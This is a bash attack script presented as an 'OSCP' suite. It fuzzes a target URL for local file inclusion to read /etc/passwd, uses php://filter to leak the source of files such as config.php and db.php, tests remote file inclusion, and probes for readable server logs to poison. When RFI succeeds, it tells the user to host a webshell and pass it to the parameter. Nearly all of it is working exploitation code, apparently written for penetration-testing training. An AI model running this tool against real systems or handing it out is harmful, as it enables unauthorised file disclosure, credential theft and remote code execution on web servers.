#!/bin/bash

# ==============================================================================
# Advanced OSCP LFI, RFI, Wrapper & Log Poisoning Suite
# Wordlist: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
# ==============================================================================

WORDLIST="/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"

# Help Function
usage() {
    echo "=============================================================================="
    echo " OSCP Advanced LFI, RFI, Wrapper & Log Poisoning Suite"
    echo "=============================================================================="
    echo " Usage: $0 <URL_with_FUZZ>"
    echo ""
    echo " Arguments:"
    echo "   URL_with_FUZZ   The vulnerable URL containing 'FUZZ' where the payload goes."
    echo ""
    echo " Options:"
    echo "   -h, --help      Display this help message and exit"
    echo ""
    echo " Examples:"
    echo "   $0 'http://10.10.10.X/vulnerable.php?page=FUZZ'"
    echo "=============================================================================="
    exit 0
}

# Check for -h or --help flags, or missing arguments
if [[ "$#" -eq 0 || "$1" == "-h" || "$1" == "--help" ]]; then
    usage
fi

URL="$1"

# Check if Seclists wordlist exists
if [ ! -f "$WORDLIST" ]; then
    echo "[-] Wordlist not found at $WORDLIST. Verify your SecLists installation."
    exit 1
fi

echo "[+] Starting LFI and Vulnerability Suite on: $URL"
echo "=================================================="

# ------------------------------------------------------------------------------
# 1. Standard LFI Fuzzing Loop (/etc/passwd)
# ------------------------------------------------------------------------------
echo "[+] Phase 1: Fuzzing for Local File Inclusion (LFI)..."
while IFS= read -r payload; do
    [[ -z "$payload" || "$payload" =~ ^# ]] && continue

    if [[ "$URL" == *"FUZZ"* ]]; then
        target="${URL//FUZZ/$payload}"
    else
        target="${URL}${payload}"
    fi

    response=$(curl -s -L "$target")
    
    if echo "$response" | grep -q "root:x:0:0:"; then
        echo "[!] SUCCESS: LFI Detected!"
        echo "    -> Payload: $payload"
        echo "    -> Target URL: $target"
        echo "--------------------------------------------------"
    fi
done < "$WORDLIST"

echo "[+] Phase 1 Complete."
echo "=================================================="

# ------------------------------------------------------------------------------
# 2. PHP Wrapper Testing (php://filter source code disclosure)
# ------------------------------------------------------------------------------
echo "[+] Phase 2: Testing PHP Wrappers (php://filter)..."

WRAPPER_FILES=("index.php" "config.php" "login.php" "db.php")

for file in "${WRAPPER_FILES[@]}"; do
    wrapper_payload="php://filter/convert.base64-encode/resource=$file"
    
    if [[ "$URL" == *"FUZZ"* ]]; then
        w_target="${URL//FUZZ/$wrapper_payload}"
    else
        w_target="${URL}${wrapper_payload}"
    fi
    
    w_resp=$(curl -s -L "$w_target")
    
    if [[ ${#w_resp} -gt 50 ]] && [[ "$w_resp" =~ ^[a-zA-Z0-9+/=]+$ ]]; then
        echo "[!] SUCCESS: Wrapper Source Code Disclosure Found!"
        echo "    -> File Target: $file"
        echo "    -> Target URL: $w_target"
        echo "    -> Base64 Output Snippet: ${w_resp:0:60}..."
        echo "    -> Decode with: echo '<base64>' | base64 -d"
        echo "--------------------------------------------------"
    fi
done

echo "[+] Phase 2 Complete."
echo "=================================================="

# ------------------------------------------------------------------------------
# 3. Remote File Inclusion (RFI) Testing (External URL fetch check)
# ------------------------------------------------------------------------------
echo "[+] Phase 3: Testing Remote File Inclusion (RFI)..."

RFI_TEST_URL="https://www.google.com"

if [[ "$URL" == *"FUZZ"* ]]; then
    rfi_target="${URL//FUZZ/$RFI_TEST_URL}"
else
    rfi_target="${URL}${RFI_TEST_URL}"
fi

echo "[*] Testing if target fetches external content from: $RFI_TEST_URL"
rfi_resp=$(curl -s -L "$rfi_target")

# Look for characteristic Google indicators or generic successful HTML return length
if echo "$rfi_resp" | grep -q -E "Google|<html|<!DOCTYPE html>"; then
    echo "[!] CRITICAL SUCCESS: RFI / External URL Inclusion Detected!"
    echo "    -> Target URL: $rfi_target"
    echo "    -> Action: The application successfully fetched an external webpage. Host your own webshell on your machine and pass it to the parameter!"
    echo "--------------------------------------------------"
else
    echo "[-] RFI check failed (allow_url_include / allow_url_fopen is likely Off)."
fi

echo "[+] Phase 3 Complete."
echo "=================================================="

# ------------------------------------------------------------------------------
# 4. Log Poisoning Probes
# ------------------------------------------------------------------------------
echo "[+] Phase 4: Probing for Common Log Files (Log Poisoning Vectors)..."

LOG_PATHS=(
    "/var/log/apache2/access.log"
    "/var/log/apache/access.log"
    "/var/log/httpd/access_log"
    "/var/log/nginx/access.log"
    "/var/log/auth.log"
    "/var/log/vsftpd.log"
)

for log in "${LOG_PATHS[@]}"; do
    if [[ "$URL" == *"FUZZ"* ]]; then
        log_target="${URL//FUZZ/$log}"
    else
        log_target="${URL}${log}"
    fi
    
    log_resp=$(curl -s -L "$log_target")
    
    if echo "$log_resp" | grep -q -E "HTTP/1\.[01]\" 200|invalid user|pam_unix"; then
        echo "[!] ACCESSIBLE LOG FOUND: $log"
        echo "    -> Target URL: $log_target"
        echo "--------------------------------------------------"
    fi
done

echo "[+] Scan finished completely. Good luck"